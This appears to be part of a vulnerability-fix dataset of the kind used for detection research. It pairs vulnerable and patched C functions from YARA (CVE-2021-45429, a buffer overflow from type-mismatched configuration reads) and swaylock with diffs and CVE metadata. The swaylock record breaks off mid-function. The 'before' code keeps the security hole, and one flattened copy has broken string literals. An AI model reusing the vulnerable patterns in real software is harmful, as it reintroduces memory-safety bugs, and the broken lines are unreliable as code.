return &VAR_2->current_block;
}",,"YR_API YR_MEMORY_BLOCK* yr_process_get_next_memory_block(
    YR_MEMORY_BLOCK_ITERATOR* iterator)
{
  YR_PROC_ITERATOR_CTX* context = (YR_PROC_ITERATOR_CTX*) iterator->context;
  YR_PROC_INFO* proc_info = (YR_PROC_INFO*) context->proc_info;

  char buffer[PATH_MAX];
  char perm[5];
  uint64_t begin, end;

  uint64_t current_begin = context->current_block.base +
                           context->current_block.size;

  uint64_t max_process_memory_chunk;

  yr_get_configuration_uint64(
      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);

  if (proc_info->next_block_end <= current_begin)
  {
    int n, path_start;

    while (fgets(buffer, sizeof(buffer), proc_info->maps) != NULL)
    {
      // If we haven't read the whole line, skip over the rest.
      if (strrchr(buffer, '\n') == NULL)
      {
        int c;
        do
        {
          c = fgetc(proc_info->maps);
        } while (c >= 0 && c != '\n');
      }

      // Each row in /proc/$PID/maps describes a region of contiguous virtual
      // memory in a process or thread. Each row has the following fields:
      //
      // address           perms offset  dev   inode   pathname
      // 08048000-08056000 r-xp 00000000 03:0c 64593   /usr/sbin/gpm
      //
      n = sscanf(
          buffer,
          ""%"" SCNx64 ""-%"" SCNx64 "" %4s ""
          ""%"" SCNx64 "" %"" SCNx64 "":%"" SCNx64 "" %"" SCNu64 "" %n"",
          &begin,
          &end,
          perm,
          &(proc_info->map_offset),
          &(proc_info->map_dmaj),
          &(proc_info->map_dmin),
          &(proc_info->map_ino),
          &path_start);

      // If the row was parsed correctly sscan must return 7.
      if (n == 7)
      {
        // path_start contains the offset within buffer where the path starts,
        // the path should start with /.
        if (buffer[path_start] == '/')
          strncpy(
              proc_info->map_path,
              buffer + path_start,
              sizeof(proc_info->map_path) - 1);
        else
          proc_info->map_path[0] = '\0';
        break;
      }
    }

    if (n == 7)
    {
      current_begin = begin;
      proc_info->next_block_end = end;
    }
    else
    {
      YR_DEBUG_FPRINTF(2, stderr, ""+ %s() = NULL\n"", __FUNCTION__);
      return NULL;
    }
  }

  context->current_block.base = current_begin;
  context->current_block.size = yr_min(
      proc_info->next_block_end - current_begin, max_process_memory_chunk);

  assert(context->current_block.size > 0);

  iterator->last_error = ERROR_SUCCESS;

  YR_DEBUG_FPRINTF(
      2,
      stderr,
      ""- %s() {} = %p // .base=0x%"" PRIx64 "" .size=%"" PRIu64 ""\n"",
      __FUNCTION__,
      result,
      context->current_block.base,
      context->current_block.size);

  return &context->current_block;
}","YR_API VAR_0* yr_process_get_next_memory_block(
    YR_MEMORY_BLOCK_ITERATOR* VAR_1)
{
  YR_PROC_ITERATOR_CTX* VAR_2 = (YR_PROC_ITERATOR_CTX*) VAR_1->context;
  YR_PROC_INFO* VAR_3 = (YR_PROC_INFO*) VAR_2->proc_info;

  char VAR_4[VAR_5];
  char VAR_6[5];
  uint64_t VAR_7, VAR_8;

  uint64_t VAR_9 = VAR_2->current_block.base +
                           VAR_2->current_block.size;

  uint64_t VAR_10;

  yr_get_configuration_uint64(
      VAR_11, &VAR_10);

  if (VAR_3->next_block_end <= VAR_9)
  {
    int VAR_12, VAR_13;

    while (fgets(VAR_4, sizeof(VAR_4), VAR_3->maps) != NULL)
    {
      /* COMMENT_0 */
      if (strrchr(VAR_4, '\n') == NULL)
      {
        int VAR_14;
        do
        {
          VAR_14 = fgetc(VAR_3->maps);
        } while (VAR_14 >= 0 && VAR_14 != '\n');
      }

      /* COMMENT_1 */
      /* COMMENT_2 */
      /* COMMENT_3 */
      /* COMMENT_4 */
      /* COMMENT_5 */
      /* COMMENT_3 */
      VAR_12 = sscanf(
          VAR_4,
          ""%"" VAR_15 ""-%"" VAR_15 "" %4s ""
          ""%"" VAR_15 "" %"" VAR_15 "":%"" VAR_15 "" %"" VAR_16 "" %n"",
          &VAR_7,
          &VAR_8,
          VAR_6,
          &(VAR_3->map_offset),
          &(VAR_3->map_dmaj),
          &(VAR_3->map_dmin),
          &(VAR_3->map_ino),
          &VAR_13);

      /* COMMENT_6 */
      if (VAR_12 == 7)
      {
        /* COMMENT_7 */
        /* COMMENT_8 */
        if (VAR_4[VAR_13] == '/')
          strncpy(
              VAR_3->map_path,
              VAR_4 + VAR_13,
              sizeof(VAR_3->map_path) - 1);
        else
          VAR_3->map_path[0] = '\0';
        break;
      }
    }

    if (VAR_12 == 7)
    {
      VAR_9 = VAR_7;
      VAR_3->next_block_end = VAR_8;
    }
    else
    {
      YR_DEBUG_FPRINTF(2, VAR_17, ""+ %s() = NULL\n"", VAR_18);
      return NULL;
    }
  }

  VAR_2->current_block.base = VAR_9;
  VAR_2->current_block.size = yr_min(
      VAR_3->next_block_end - VAR_9, VAR_10);

  assert(VAR_2->current_block.size > 0);

  VAR_1->last_error = VAR_19;

  YR_DEBUG_FPRINTF(
      2,
      VAR_17,
      ""- %s() {} = %p // .base=0x%"" VAR_20 "" .size=%"" VAR_21 ""\n"",
      VAR_18,
      VAR_22,
      VAR_2->current_block.base,
      VAR_2->current_block.size);

  return &VAR_2->current_block;
}",,"--- func_before
+++ func_after
@@ -13,8 +13,8 @@
 
   uint64_t max_process_memory_chunk;
 
-  yr_get_configuration(
-      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);
+  yr_get_configuration_uint64(
+      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);
 
   if (proc_info->next_block_end <= current_begin)
   {","{'deleted_lines': ['  yr_get_configuration(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);'], 'added_lines': ['  yr_get_configuration_uint64(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,libyara/proc/windows.c,yr_process_get_next_memory_block,"YR_API YR_MEMORY_BLOCK* yr_process_get_next_memory_block(
YR_MEMORY_BLOCK_ITERATOR* iterator)
{
YR_PROC_ITERATOR_CTX* context = (YR_PROC_ITERATOR_CTX*) iterator->context;
YR_PROC_INFO* proc_info = (YR_PROC_INFO*) context->proc_info;
MEMORY_BASIC_INFORMATION mbi;
void* address =
(void*) (context->current_block.base + context->current_block.size);
uint64_t max_process_memory_chunk;
yr_get_configuration(
YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);
iterator->last_error = ERROR_SUCCESS;
while (address < proc_info->si.lpMaximumApplicationAddress &&
VirtualQueryEx(proc_info->hProcess, address, &mbi, sizeof(mbi)) != 0)
{
if ((uint8_t*) address + mbi.RegionSize <= (uint8_t*) address)
break;
if (mbi.State == MEM_COMMIT && ((mbi.Protect & PAGE_NOACCESS) == 0))
{
size_t chuck_size =
mbi.RegionSize -
(size_t) (((uint8_t*) address) - ((uint8_t*) mbi.BaseAddress));
if (((uint64_t) chuck_size) > max_process_memory_chunk)
{
chuck_size = (size_t) max_process_memory_chunk;
}
context->current_block.base = (size_t) address;
context->current_block.size = chuck_size;
return &context->current_block;
}
address = (uint8_t*) mbi.BaseAddress + mbi.RegionSize;
}
return NULL;
}","YR_API VAR_0* yr_process_get_next_memory_block(
YR_MEMORY_BLOCK_ITERATOR* VAR_1)
{
YR_PROC_ITERATOR_CTX* VAR_2 = (YR_PROC_ITERATOR_CTX*) VAR_1->context;
YR_PROC_INFO* VAR_3 = (YR_PROC_INFO*) VAR_2->proc_info;
MEMORY_BASIC_INFORMATION VAR_4;
void* VAR_5 =
(void*) (VAR_2->current_block.base + VAR_2->current_block.size);
uint64_t VAR_6;
yr_get_configuration(
VAR_7, (void*) &VAR_6);
VAR_1->last_error = VAR_8;
while (VAR_5 < VAR_3->si.lpMaximumApplicationAddress &&
VirtualQueryEx(VAR_3->hProcess, VAR_5, &VAR_4, sizeof(VAR_4)) != 0)
{
if ((uint8_t*) VAR_5 + VAR_4.RegionSize <= (uint8_t*) VAR_5)
break;
if (VAR_4.State == VAR_9 && ((VAR_4.Protect & VAR_10) == 0))
{
size_t VAR_11 =
VAR_4.RegionSize -
(size_t) (((uint8_t*) VAR_5) - ((uint8_t*) VAR_4.BaseAddress));
if (((uint64_t) VAR_11) > VAR_6)
{
VAR_11 = (size_t) VAR_6;
}
VAR_2->current_block.base = (size_t) VAR_5;
VAR_2->current_block.size = VAR_11;
return &VAR_2->current_block;
}
VAR_5 = (uint8_t*) VAR_4.BaseAddress + VAR_4.RegionSize;
}
return NULL;
}",,"YR_API YR_MEMORY_BLOCK* yr_process_get_next_memory_block(
    YR_MEMORY_BLOCK_ITERATOR* iterator)
{
  YR_PROC_ITERATOR_CTX* context = (YR_PROC_ITERATOR_CTX*) iterator->context;
  YR_PROC_INFO* proc_info = (YR_PROC_INFO*) context->proc_info;

  MEMORY_BASIC_INFORMATION mbi;
  void* address =
      (void*) (context->current_block.base + context->current_block.size);
  uint64_t max_process_memory_chunk;

  yr_get_configuration_uint64(
      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);

  iterator->last_error = ERROR_SUCCESS;

  while (address < proc_info->si.lpMaximumApplicationAddress &&
         VirtualQueryEx(proc_info->hProcess, address, &mbi, sizeof(mbi)) != 0)
  {
    // mbi.RegionSize can overflow address while scanning a 64-bit process
    // with a 32-bit YARA.
    if ((uint8_t*) address + mbi.RegionSize <= (uint8_t*) address)
      break;

    if (mbi.State == MEM_COMMIT && ((mbi.Protect & PAGE_NOACCESS) == 0))
    {
      size_t chuck_size =
          mbi.RegionSize -
          (size_t) (((uint8_t*) address) - ((uint8_t*) mbi.BaseAddress));

      if (((uint64_t) chuck_size) > max_process_memory_chunk)
      {
        chuck_size = (size_t) max_process_memory_chunk;
      }

      context->current_block.base = (size_t) address;
      context->current_block.size = chuck_size;

      return &context->current_block;
    }

    address = (uint8_t*) mbi.BaseAddress + mbi.RegionSize;
  }

  return NULL;
}","YR_API VAR_0* yr_process_get_next_memory_block(
    YR_MEMORY_BLOCK_ITERATOR* VAR_1)
{
  YR_PROC_ITERATOR_CTX* VAR_2 = (YR_PROC_ITERATOR_CTX*) VAR_1->context;
  YR_PROC_INFO* VAR_3 = (YR_PROC_INFO*) VAR_2->proc_info;

  MEMORY_BASIC_INFORMATION VAR_4;
  void* VAR_5 =
      (void*) (VAR_2->current_block.base + VAR_2->current_block.size);
  uint64_t VAR_6;

  yr_get_configuration_uint64(
      VAR_7, &VAR_6);

  VAR_1->last_error = VAR_8;

  while (VAR_5 < VAR_3->si.lpMaximumApplicationAddress &&
         VirtualQueryEx(VAR_3->hProcess, VAR_5, &VAR_4, sizeof(VAR_4)) != 0)
  {
    /* COMMENT_0 */
    /* COMMENT_1 */
    if ((uint8_t*) VAR_5 + VAR_4.RegionSize <= (uint8_t*) VAR_5)
      break;

    if (VAR_4.State == VAR_9 && ((VAR_4.Protect & VAR_10) == 0))
    {
      size_t VAR_11 =
          VAR_4.RegionSize -
          (size_t) (((uint8_t*) VAR_5) - ((uint8_t*) VAR_4.BaseAddress));

      if (((uint64_t) VAR_11) > VAR_6)
      {
        VAR_11 = (size_t) VAR_6;
      }

      VAR_2->current_block.base = (size_t) VAR_5;
      VAR_2->current_block.size = VAR_11;

      return &VAR_2->current_block;
    }

    VAR_5 = (uint8_t*) VAR_4.BaseAddress + VAR_4.RegionSize;
  }

  return NULL;
}",,"--- func_before
+++ func_after
@@ -9,8 +9,8 @@
       (void*) (context->current_block.base + context->current_block.size);
   uint64_t max_process_memory_chunk;
 
-  yr_get_configuration(
-      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);
+  yr_get_configuration_uint64(
+      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);
 
   iterator->last_error = ERROR_SUCCESS;
 ","{'deleted_lines': ['  yr_get_configuration(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);'], 'added_lines': ['  yr_get_configuration_uint64(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,libyara/scan.c,_yr_scan_match_callback,"static int _yr_scan_match_callback(
const uint8_t* match_data,
int32_t match_length,
int flags,
void* args)
{
CALLBACK_ARGS* callback_args = (CALLBACK_ARGS*) args;
YR_STRING* string = callback_args->string;
YR_MATCH* new_match;
int result = ERROR_SUCCESS;
size_t match_offset = match_data - callback_args->data;
YR_DEBUG_FPRINTF(
2,
stderr,
""+ %s(match_data=%p match_length=%d) {       "" match_offset=%zu args->data=%p args->string.length=%u""
"" args->data_base=0x%"" PRIx64 "" args->data_size=%zu""
"" args->forward_matches=%'u\n"",
__FUNCTION__,
match_data,
match_length,
match_offset,
callback_args->data,
callback_args->string->length,
callback_args->data_base,
callback_args->data_size,
callback_args->forward_matches);
match_length += callback_args->forward_matches;
assert(match_offset + match_length <= callback_args->data_size);
if (callback_args->full_word)
{
if (flags & RE_FLAGS_WIDE)
{
if (match_offset >= 2 && *(match_data - 1) == 0 &&
yr_isalnum(match_data - 2))
goto _exit;  
if (match_offset + match_length + 1 < callback_args->data_size &&
*(match_data + match_length + 1) == 0 &&
yr_isalnum(match_data + match_length))
goto _exit;      }
else
{
if (match_offset >= 1 && yr_isalnum(match_data - 1))
goto _exit;  
if (match_offset + match_length < callback_args->data_size &&
yr_isalnum(match_data + match_length))
goto _exit;      }
}
if (STRING_IS_CHAIN_PART(string))
{
result = _yr_scan_verify_chained_string_match(
string,
callback_args->context,
match_data,
callback_args->data_base,
match_offset,
match_length);
}
else
{
uint32_t max_match_data;
FAIL_ON_ERROR(
yr_get_configuration(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));
new_match = yr_notebook_alloc(
callback_args->context->matches_notebook, sizeof(YR_MATCH));
if (new_match == NULL)
{
result = ERROR_INSUFFICIENT_MEMORY;
goto _exit;
}
new_match->data_length = yr_min(match_length, (int32_t) max_match_data);
if (new_match->data_length > 0)
{
new_match->data = yr_notebook_alloc(
callback_args->context->matches_notebook, new_match->data_length);
if (new_match->data == NULL)
{
result = ERROR_INSUFFICIENT_MEMORY;
goto _exit;
}
memcpy((void*) new_match->data, match_data, new_match->data_length);
}
else
{
new_match->data = NULL;
}
if (result == ERROR_SUCCESS)
{
new_match->base = callback_args->data_base;
new_match->offset = match_offset;
new_match->match_length = match_length;
new_match->prev = NULL;
new_match->next = NULL;
new_match->is_private = STRING_IS_PRIVATE(string);
FAIL_ON_ERROR(_yr_scan_add_match_to_list(
new_match,
&callback_args->context->matches[string->idx],
STRING_IS_GREEDY_REGEXP(string)));
}
}
_exit:;
YR_DEBUG_FPRINTF(2, stderr, ""} = %d 
return result;
}","static int _yr_scan_match_callback(
const uint8_t* VAR_0,
int32_t VAR_1,
int VAR_2,
void* VAR_3)
{
CALLBACK_ARGS* VAR_4 = (CALLBACK_ARGS*) VAR_3;
YR_STRING* VAR_5 = VAR_4->string;
YR_MATCH* VAR_6;
int VAR_7 = VAR_8;
size_t VAR_9 = VAR_0 - VAR_4->data;
YR_DEBUG_FPRINTF(
2,
VAR_10,
""+ %s(match_data=%p match_length=%d) { //""
"" match_offset=%zu args->data=%p args->string.length=%u""
"" args->data_base=0x%"" VAR_11 "" args->data_size=%zu""
"" args->forward_matches=%'u\n"",
VAR_12,
VAR_0,
VAR_1,
VAR_9,
VAR_4->data,
VAR_4->string->length,
VAR_4->data_base,
VAR_4->data_size,
VAR_4->forward_matches);
VAR_1 += VAR_4->forward_matches;
assert(VAR_9 + VAR_1 <= VAR_4->data_size);
if (VAR_4->full_word)
{
if (VAR_2 & VAR_13)
{
if (VAR_9 >= 2 && *(VAR_0 - 1) == 0 &&
yr_isalnum(VAR_0 - 2))
goto _exit;  
if (VAR_9 + VAR_1 + 1 < VAR_4->data_size &&
*(VAR_0 + VAR_1 + 1) == 0 &&
yr_isalnum(VAR_0 + VAR_1))
goto _exit;  
}
else
{
if (VAR_9 >= 1 && yr_isalnum(VAR_0 - 1))
goto _exit;  
if (VAR_9 + VAR_1 < VAR_4->data_size &&
yr_isalnum(VAR_0 + VAR_1))
goto _exit;  
}
}
if (STRING_IS_CHAIN_PART(VAR_5))
{
VAR_7 = _yr_scan_verify_chained_string_match(
VAR_5,
VAR_4->context,
VAR_0,
VAR_4->data_base,
VAR_9,
VAR_1);
}
else
{
uint32_t VAR_14;
FAIL_ON_ERROR(
yr_get_configuration(VAR_15, &VAR_14));
VAR_6 = yr_notebook_alloc(
VAR_4->context->matches_notebook, sizeof(YR_MATCH));
if (VAR_6 == NULL)
{
VAR_7 = VAR_16;
goto _exit;
}
VAR_6->data_length = yr_min(VAR_1, (int32_t) VAR_14);
if (VAR_6->data_length > 0)
{
VAR_6->data = yr_notebook_alloc(
VAR_4->context->matches_notebook, VAR_6->data_length);
if (VAR_6->data == NULL)
{
VAR_7 = VAR_16;
goto _exit;
}
memcpy((void*) VAR_6->data, VAR_0, VAR_6->data_length);
}
else
{
VAR_6->data = NULL;
}
if (VAR_7 == VAR_8)
{
VAR_6->base = VAR_4->data_base;
VAR_6->offset = VAR_9;
VAR_6->match_length = VAR_1;
VAR_6->prev = NULL;
VAR_6->next = NULL;
VAR_6->is_private = STRING_IS_PRIVATE(VAR_5);
FAIL_ON_ERROR(_yr_scan_add_match_to_list(
VAR_6,
&VAR_4->context->matches[VAR_5->idx],
STRING_IS_GREEDY_REGEXP(VAR_5)));
}
}
_exit:;
YR_DEBUG_FPRINTF(2, VAR_10, ""} = %d // %s()\n"", VAR_7, VAR_12);
return VAR_7;
}",VirusTotal/yara/b34b7e74c862c129b801832b6b85401fbada2b01/scan.c/vul/before/0.json,"static int _yr_scan_match_callback(
    const uint8_t* match_data,
    int32_t match_length,
    int flags,
    void* args)
{
  CALLBACK_ARGS* callback_args = (CALLBACK_ARGS*) args;

  YR_STRING* string = callback_args->string;
  YR_MATCH* new_match;

  int result = ERROR_SUCCESS;

  size_t match_offset = match_data - callback_args->data;

  YR_DEBUG_FPRINTF(
      2,
      stderr,
      ""+ %s(match_data=%p match_length=%d) { //""
      "" match_offset=%zu args->data=%p args->string.length=%u""
      "" args->data_base=0x%"" PRIx64 "" args->data_size=%zu""
      "" args->forward_matches=%'u\n"",
      __FUNCTION__,
      match_data,
      match_length,
      match_offset,
      callback_args->data,
      callback_args->string->length,
      callback_args->data_base,
      callback_args->data_size,
      callback_args->forward_matches);

  // total match length is the sum of backward and forward matches.
  match_length += callback_args->forward_matches;

  // make sure that match fits into the data.
  assert(match_offset + match_length <= callback_args->data_size);

  if (callback_args->full_word)
  {
    if (flags & RE_FLAGS_WIDE)
    {
      if (match_offset >= 2 && *(match_data - 1) == 0 &&
          yr_isalnum(match_data - 2))
        goto _exit;  // return ERROR_SUCCESS;

      if (match_offset + match_length + 1 < callback_args->data_size &&
          *(match_data + match_length + 1) == 0 &&
          yr_isalnum(match_data + match_length))
        goto _exit;  // return ERROR_SUCCESS;
    }
    else
    {
      if (match_offset >= 1 && yr_isalnum(match_data - 1))
        goto _exit;  // return ERROR_SUCCESS;

      if (match_offset + match_length < callback_args->data_size &&
          yr_isalnum(match_data + match_length))
        goto _exit;  // return ERROR_SUCCESS;
    }
  }

  if (STRING_IS_CHAIN_PART(string))
  {
    result = _yr_scan_verify_chained_string_match(
        string,
        callback_args->context,
        match_data,
        callback_args->data_base,
        match_offset,
        match_length);
  }
  else
  {
    uint32_t max_match_data;

    FAIL_ON_ERROR(
        yr_get_configuration_uint32(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));

    new_match = yr_notebook_alloc(
        callback_args->context->matches_notebook, sizeof(YR_MATCH));

    if (new_match == NULL)
    {
      result = ERROR_INSUFFICIENT_MEMORY;
      goto _exit;
    }

    new_match->data_length = yr_min(match_length, (int32_t) max_match_data);

    if (new_match->data_length > 0)
    {
      new_match->data = yr_notebook_alloc(
          callback_args->context->matches_notebook, new_match->data_length);

      if (new_match->data == NULL)
      {
        result = ERROR_INSUFFICIENT_MEMORY;
        goto _exit;
      }

      memcpy((void*) new_match->data, match_data, new_match->data_length);
    }
    else
    {
      new_match->data = NULL;
    }

    if (result == ERROR_SUCCESS)
    {
      new_match->base = callback_args->data_base;
      new_match->offset = match_offset;
      new_match->match_length = match_length;
      new_match->prev = NULL;
      new_match->next = NULL;
      new_match->is_private = STRING_IS_PRIVATE(string);

      FAIL_ON_ERROR(_yr_scan_add_match_to_list(
          new_match,
          &callback_args->context->matches[string->idx],
          STRING_IS_GREEDY_REGEXP(string)));
    }
  }

_exit:;

  YR_DEBUG_FPRINTF(2, stderr, ""} = %d // %s()\n"", result, __FUNCTION__);

  return result;
}","static int _yr_scan_match_callback(
    const uint8_t* VAR_0,
    int32_t VAR_1,
    int VAR_2,
    void* VAR_3)
{
  CALLBACK_ARGS* VAR_4 = (CALLBACK_ARGS*) VAR_3;

  YR_STRING* VAR_5 = VAR_4->string;
  YR_MATCH* VAR_6;

  int VAR_7 = VAR_8;

  size_t VAR_9 = VAR_0 - VAR_4->data;

  YR_DEBUG_FPRINTF(
      2,
      VAR_10,
      ""+ %s(match_data=%p match_length=%d) { //""
      "" match_offset=%zu args->data=%p args->string.length=%u""
      "" args->data_base=0x%"" VAR_11 "" args->data_size=%zu""
      "" args->forward_matches=%'u\n"",
      VAR_12,
      VAR_0,
      VAR_1,
      VAR_9,
      VAR_4->data,
      VAR_4->string->length,
      VAR_4->data_base,
      VAR_4->data_size,
      VAR_4->forward_matches);

  /* COMMENT_0 */
  VAR_1 += VAR_4->forward_matches;

  /* COMMENT_1 */
  assert(VAR_9 + VAR_1 <= VAR_4->data_size);

  if (VAR_4->full_word)
  {
    if (VAR_2 & VAR_13)
    {
      if (VAR_9 >= 2 && *(VAR_0 - 1) == 0 &&
          yr_isalnum(VAR_0 - 2))
        goto _exit;  /* COMMENT_2 */

      if (VAR_9 + VAR_1 + 1 < VAR_4->data_size &&
          *(VAR_0 + VAR_1 + 1) == 0 &&
          yr_isalnum(VAR_0 + VAR_1))
        goto _exit;  /* COMMENT_2 */
    }
    else
    {
      if (VAR_9 >= 1 && yr_isalnum(VAR_0 - 1))
        goto _exit;  /* COMMENT_2 */

      if (VAR_9 + VAR_1 < VAR_4->data_size &&
          yr_isalnum(VAR_0 + VAR_1))
        goto _exit;  /* COMMENT_2 */
    }
  }

  if (STRING_IS_CHAIN_PART(VAR_5))
  {
    VAR_7 = _yr_scan_verify_chained_string_match(
        VAR_5,
        VAR_4->context,
        VAR_0,
        VAR_4->data_base,
        VAR_9,
        VAR_1);
  }
  else
  {
    uint32_t VAR_14;

    FAIL_ON_ERROR(
        yr_get_configuration_uint32(VAR_15, &VAR_14));

    VAR_6 = yr_notebook_alloc(
        VAR_4->context->matches_notebook, sizeof(YR_MATCH));

    if (VAR_6 == NULL)
    {
      VAR_7 = VAR_16;
      goto _exit;
    }

    VAR_6->data_length = yr_min(VAR_1, (int32_t) VAR_14);

    if (VAR_6->data_length > 0)
    {
      VAR_6->data = yr_notebook_alloc(
          VAR_4->context->matches_notebook, VAR_6->data_length);

      if (VAR_6->data == NULL)
      {
        VAR_7 = VAR_16;
        goto _exit;
      }

      memcpy((void*) VAR_6->data, VAR_0, VAR_6->data_length);
    }
    else
    {
      VAR_6->data = NULL;
    }

    if (VAR_7 == VAR_8)
    {
      VAR_6->base = VAR_4->data_base;
      VAR_6->offset = VAR_9;
      VAR_6->match_length = VAR_1;
      VAR_6->prev = NULL;
      VAR_6->next = NULL;
      VAR_6->is_private = STRING_IS_PRIVATE(VAR_5);

      FAIL_ON_ERROR(_yr_scan_add_match_to_list(
          VAR_6,
          &VAR_4->context->matches[VAR_5->idx],
          STRING_IS_GREEDY_REGEXP(VAR_5)));
    }
  }

_exit:;

  YR_DEBUG_FPRINTF(2, VAR_10, ""} = %d // %s()\n"", VAR_7, VAR_12);

  return VAR_7;
}",VirusTotal/yara/b34b7e74c862c129b801832b6b85401fbada2b01/scan.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -75,7 +75,7 @@
     uint32_t max_match_data;
 
     FAIL_ON_ERROR(
-        yr_get_configuration(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));
+        yr_get_configuration_uint32(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));
 
     new_match = yr_notebook_alloc(
         callback_args->context->matches_notebook, sizeof(YR_MATCH));","{'deleted_lines': ['        yr_get_configuration(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));'], 'added_lines': ['        yr_get_configuration_uint32(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2022-26530,['CWE-Other'],AV:N/AC:L/Au:N/C:P/I:N/A:P,0,swaywm/swaylock,"Add support for ext-session-lock-v1

This is a new protocol to lock the session [1]. It should be more
reliable than layer-shell + input-inhibitor.

[1]: https://gitlab.freedesktop.org/wayland/wayland-protocols/-/merge_requests/131",1d1c75b6316d21933069a9d201f966d84099f6ca,https://github.com/swaywm/swaylock/commit/1d1c75b6316d21933069a9d201f966d84099f6ca,main.c,handle_global,"static void handle_global(void *data, struct wl_registry *registry,
uint32_t name, const char *interface, uint32_t version) {
struct swaylock_state *state = data;
if (strcmp(interface, wl_compositor_interface.name) == 0) {
state->compositor = wl_registry_bind(registry, name,
&wl_compositor_interface, 4);
} else if (strcmp(interface, wl_subcompositor_interface.name) == 0) {
state->subcompositor = wl_registry_bind(registry, name,
&wl_subcompositor_interface, 1);
} else if (strcmp(interface, wl_shm_interface.name) == 0) {
state->shm = wl_registry_bind(registry, name,
&wl_shm_interface, 1);
} else if (strcmp(interface, wl_seat_interface.name) == 0) {
struct wl_seat *seat = wl_registry_bind(
registry, name, &wl_seat_interface, 4);
struct swaylock_seat *swaylock_seat =
calloc(1, sizeof(struct swaylock_seat));
swaylock_seat->state = state;
wl_seat_add_listener(seat, &seat_listener, swaylock_seat);
} else if (strcmp(interface, zwlr_layer_shell_v1_interface.name) == 0) {
state->layer_shell = wl_registry_bind(
registry, name, &zwlr_layer_shell_v1_interface, 1);
} else if (strcmp(interface, zwlr_input_inhibit_manager_v1_interface.name) == 0) {
state->input_inhibit_manager = wl_registry_bind(
registry, name, &zwlr_input_inhibit_manager_v1_interface, 1);
} else if (strcmp(interface, zxdg_output_manager_v1_interface.name) == 0) {
state->zxdg_output_manager = wl_registry_bind(
registry, name, &zxdg_output_manager_v1_interface, 2);
} else if (strcmp(interface, wl_output_interface.name) == 0) {
struct swaylock_surface *surface =
calloc(1, sizeof(struct swaylock_surface));
surface->state = state;
surface->output = wl_registry_bind(registry, name,
&wl_output_interface, 3);
surface->output_global_name = name;
wl_output_add_listener(surface->output, &_wl_output_listener, surface);
wl_list_insert(&state->surfaces, &surface->link);
if (state->run_display) {
create_layer_surface(surface);
wl_display_roundtrip(state->display);
}
}
}","static void handle_global(void *VAR_0, struct wl_registry *VAR_1,
uint32_t VAR_2, const char *VAR_3, uint32_t VAR_4) {
struct swaylock_state *VAR_5 = VAR_0;
if (strcmp(VAR_3, VAR_6.name) == 0) {
VAR_5->compositor = wl_registry_bind(VAR_1, VAR_2,
&VAR_6, 4);
} else if (strcmp(VAR_3, VAR_7.name) == 0) {
VAR_5->subcompositor = wl_registry_bind(VAR_1, VAR_2,
&VAR_7, 1);
} else if (strcmp(VAR_3, VAR_8.name) == 0) {
VAR_5->shm = wl_registry_bind(VAR_1, VAR_2,
&VAR_8, 1);
} else if (strcmp(VAR_3, VAR_9.name) == 0) {
struct wl_seat *VAR_10 = wl_registry_bind(
VAR_1, VAR_2, &VAR_9, 4);
struct swaylock_seat *swaylock_seat =
calloc(1, sizeof(struct swaylock_seat));
swaylock_seat->state = VAR_5;
wl_seat_add_listener(VAR_10, &VAR_11, swaylock_seat);
} else if (strcmp(VAR_3, VAR_12.name) == 0) {
VAR_5->layer_shell = wl_registry_bind(
VAR_1, VAR_2, &VAR_12, 1);
} else if (strcmp(VAR_3, VAR_13.name) == 0) {
VAR_5->input_inhibit_manager = wl_registry_bind(
VAR_1, VAR_2, &VAR_13, 1);
} else if (strcmp(VAR_3, VAR_14.name) == 0) {
VAR_5->zxdg_output_manager = wl_registry_bind(
VAR_1, VAR_2, &VAR_14, 2);
